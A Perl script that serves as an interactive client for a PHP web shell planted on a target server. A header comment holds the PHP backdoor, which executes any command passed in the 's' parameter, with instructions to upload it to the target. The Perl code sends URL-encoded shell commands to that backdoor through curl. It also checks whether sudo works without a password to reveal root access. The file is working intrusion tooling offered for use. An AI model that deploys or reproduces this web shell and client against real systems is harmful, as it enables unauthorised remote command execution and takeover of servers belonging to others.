#!/opt/local/bin/perl

##########################################################
# This perl script interacts with a simple php shell.    #
# It is designed to act like a standard bash style shell #
# It does have some limitations and is a work in         #
# progress. Enjoy it!                                    #
##########################################################
# Todos:                     #  Limitations/Bugs:        #
#                            #  - ctrl-c resets prompt   #
# - separate commands by ;   #    the first time but not #
#   and have them run        #    after that             #
#   separately (split?)      #  - Try not to make        #
# - Fix ctrl-C               #    commands too complex   #
# - remove global vars       #  - cd will bug out a bit  #
# - clean up code, always    #    if there are multiple  #
# - Base64 encode URL?       #    in one command         #
##########################################################
# Here is the simple shell to upload to the target	 #
# <?php                                                  #
# 	 $cmd = $_REQUEST["s"];                          #
#	 exec($cmd, $out);                               #
#	 foreach ($out as $line){                        #
#		 echo "$line <br>";                      #
#	 }                                               #
# ?>                                                     #
##########################################################

use warnings;
use strict;
our $pwd; #working directory variable 
our $loc; #web address of web shell
our $user; #user being used to run commands
our $curl; #curl+options+$loc+s
our $debug; # debug variable
our $isctrlc; #if control c has been triggered this variable will be set, helps with prompt
our $promptsign = "\$";
$SIG{INT} = \&ctrlc; #defines control-C action

############################
# Simple function to strip #
# HTML tags <*> from input #
# parameter. Changes <br>s #
# to \n's as well for      #
# nicer output.            #
############################
sub StripTags{
	if (defined($_[1])){
		$_[0] =~ s/<br>/\n/g;
	}
	$_[0] =~ s/<\w+>|<\/\w+>//g;
}

############################
# A janky way to do cd...  #
# cd's to the previous dir #
# runs the full command    #
# and then figures out the #
# pwd (dir after command   #
#   HEY IT WORKS OKAY?!?   #
############################
sub cd{
	my $fullcmd = URLEncode("cd $pwd;$_[0];pwd");
	$pwd = `$curl=$fullcmd`;
	StripTags($pwd);
	$pwd =~ s/^\s+|\s+$//g;	
}

############################
# URL Encodes the input.   #
# Takes a string as the    #
# data to be encoded and   #
# returns the URL encoded  #
# string                   #
############################
sub URLEncode{
    my $encodedstr = "";
    foreach (split //, $_[0]) {
        $encodedstr .= "%".unpack "H*", $_;
    }
    return uc($encodedstr);
}

############################
# Defines ctrl-c behavior. #
# Kills curl and returns   #
# to the shell.            #
############################
sub ctrlc{
	`killall -9 curl &>/dev/null`;
        $isctrlc = 1;
	print "\n$pwd $user$promptsign ";
}

############################
# The main shell of the    #
# program. Runs commands   #
# with curl.               #
############################
sub shell{
        if (!$isctrlc){
	    print "\n$pwd $user$promptsign "; #prints shell-like prompt
        }
        $isctrlc = 0;
	chomp(my $input = <STDIN>);
	my @parts = split(';',$input);
	if ($input eq "quit" || $input eq "exit"){
		exit;
	}
        if ($input eq ""){
            return;
        }
        if ($input eq "debugon"){
                $debug=1;
                return;
        }
        if ($input eq "debugoff"){
                $debug=0;
                return;
        }
        if ($debug){
            print "debug: $input\n";
            print "debug: $curl=cd $pwd;$input 2>&1\n";
        }
        my $fullcmd = URLEncode("cd $pwd;$input 2>&1");
        if ($debug){print "debug: $curl=$fullcmd\n";}
	foreach my $cmd (@parts){
		if ($cmd =~ m/cd \S+/){
			cd($cmd);
		}
	}

	chomp(my $output = `$curl=$fullcmd`); #runs command and captures output
	#clean up output
	StripTags($output,1);
	chomp($output);
	$output =~ s/^\s+|\s+$//g;

	if ($output ne ""){
		print "$output";
	}
}

#prompt for, get, and check for existence of a web shell at the user spcified address.
print "Address of shell: ";
chomp($loc = <STDIN>);
#set up $curl variable
$curl = "curl -s $loc?%73";
my $cmd = URLEncode("echo index.php");
if (`$curl=$cmd` =~ m/index\.php/){
	print "Shell found!\n";
}else{
	print "Shell not found!\n";
	exit;
}

#get current user and working dir for the prompt
my $enccmd = URLEncode("whoami");
$user = `$curl=$enccmd`;
$enccmd = URLEncode("sudo whoami");
if (`$curl=$enccmd` =~ m/root/){
    $promptsign = "#";
    print "You have root priviledge with sudo (nopasswd) or the server is running as root!";
}
StripTags($user);
chomp($user);
$enccmd = URLEncode("pwd");
$pwd = `$curl=$enccmd`;
StripTags($pwd);
chomp($pwd);
$user =~ s/\s+$|^\s+//g;
$pwd =~ s/^\s+|\s+$//g;

#run the shell until "quit" or "exit"
while (1){
	shell();
}
